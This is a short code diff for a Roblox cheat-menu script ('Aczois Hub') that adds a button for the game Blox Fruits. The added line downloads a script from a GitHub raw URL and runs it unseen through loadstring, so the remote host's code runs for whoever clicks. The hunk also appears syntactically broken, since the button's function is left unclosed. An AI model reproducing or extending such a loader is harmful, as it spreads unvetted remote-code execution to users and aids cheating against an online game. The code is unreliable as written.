@@ -4,7 +4,7 @@ local Pendulum = Library:New("Aczois Hub")
 local Exploit1 = Pendulum:NewTab("B")
 
 Exploit1:NewButton("Blox Fruits", "Domadic Hub", function()
-
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Domadicoof/Domadicoof/main/Domadichub/NottoGay/Start.ranscript"))()
 
 local Exploit1 = Pendulum:NewTab("F")
 
